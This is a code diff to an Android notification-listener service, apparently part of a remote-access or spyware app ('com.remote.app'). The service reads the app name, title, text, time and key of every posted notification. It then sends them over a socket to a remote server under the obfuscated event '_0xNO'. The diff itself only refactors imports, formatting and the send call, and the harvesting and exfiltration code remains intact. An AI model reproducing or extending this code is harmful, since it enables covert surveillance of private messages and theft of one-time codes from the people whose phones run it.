@@ -4,14 +4,18 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.app.Notification;
-import android.os.Bundle;
+import android.os.Build;
 import android.os.IBinder;
 
 import android.content.Intent;
 
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
+import android.support.annotation.RequiresApi;
 
+import com.remote.app.socket.IOSocket;
+
+@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
 public class NotificationListener extends NotificationListenerService {
 
     @Override
@@ -20,13 +24,19 @@ public class NotificationListener extends NotificationListenerService {
     }
 
     @Override
-    public void onNotificationPosted(StatusBarNotification sbn){
+    public void onNotificationRemoved(StatusBarNotification sbn) {
+        super.onNotificationRemoved(sbn);
+    }
+
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
         try {
             String appName = sbn.getPackageName();
+
             String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
             CharSequence contentCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
             String content = "";
-            if(contentCs != null) content = contentCs.toString();
+            if (contentCs != null) content = contentCs.toString();
             long postTime = sbn.getPostTime();
             String uniqueKey = sbn.getKey();
 
@@ -36,7 +46,8 @@ public class NotificationListener extends NotificationListenerService {
             data.put("content", "" + content);
             data.put("postTime", postTime);
             data.put("key", uniqueKey);
-            IOSocket.getInstance().getIoSocket().send("_0xNO" , data);
+
+            IOSocket.getInstance().send("_0xNO", data);
         } catch (JSONException e) {
             e.printStackTrace();
         }
